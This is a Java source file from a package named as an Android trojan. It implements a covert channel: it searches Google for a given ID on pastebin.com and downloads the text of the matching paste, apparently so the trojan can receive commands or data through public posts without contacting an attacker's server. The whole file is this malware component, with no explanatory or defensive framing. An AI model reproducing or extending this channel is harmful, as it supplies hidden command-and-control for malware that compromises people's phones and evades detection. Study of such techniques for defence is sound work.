package il.ac.colman.androidtrojan.Channels.PasteBin;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

//class with static methods which pooling data of specific ID
public class DataPooler {

	public static String getData(String id) throws MalformedURLException, UnsupportedEncodingException{
		//getting the address of the Pastebin post.
		String beforeValue = "\"unescapedUrl\":\"";//
		String afterValue = "\"";
		//setting the url:
		String google = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=";
		String search = id + " site:pastebin.com";
		String charset = "UTF-8";
		URL url = new URL(google + URLEncoder.encode(search, charset));
		String postUrl = GetValueInLineBetweenStrings(beforeValue, afterValue, url);
		//check if there is something like this on google:
		if(postUrl == null)
			return "-1";

		//getting the post data as result:
		String result = getPostData(postUrl);



		return result;
	}

	private static String getPostData(String dataURL){
		try {
			//setting the url:
			URL url = new URL(dataURL);

			//setting the string to search:
			String firstLineToSearch = "<textarea id=\"paste_code\"";
			String lastLineToSearch = "</textarea>";

			//finding the first line:
			String result = "";
			boolean found = false;
			// Read all the text returned by the server
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
			String line;
			String breakLine = "\n";
			while ((line = in.readLine()) != null) {
				//if we found the first line:
				if(line.contains(firstLineToSearch)){
					found = true;
					//adding the first line:
					result = line.substring(line.indexOf('>') + 1) + breakLine;
					//until the last line:
					while((line = in.readLine()) != null){
						if(line.contains(lastLineToSearch)){
							//adding the last line:
							result += line.substring(0, line.indexOf('<'));
							break;
						}
						else
							result += (line + breakLine);
					}
					
					//breaking the loop beacuse we already find the data:
					break;
				}
			}
			
			//returning the data we found:
			if(found)
				return result;
			else
				return "-1";

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//else, if we didn't find data, we will return null:
		return null;
	}

	private static String GetValueInLineBetweenStrings(String beforeValue, String afterValue, URL url){
		try
		{
			int beforeValueLength = beforeValue.length();       

			// Read all the text returned by the server
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
			String line;
			while ((line = in.readLine()) != null) {
				int beforeValueIndex = line.indexOf(beforeValue);
				int afterValueIndex = -1;
				if (beforeValueIndex != -1)
				{
					afterValueIndex = line.indexOf(afterValue, beforeValueIndex + beforeValueLength);
					if (afterValueIndex == -1)
					{
						continue;
					}
				}
				else
					continue;

				return line.substring(beforeValueIndex + beforeValueLength, afterValueIndex);
			}
			in.close();
		}
		catch (Exception e){}
		return null;
	}


}
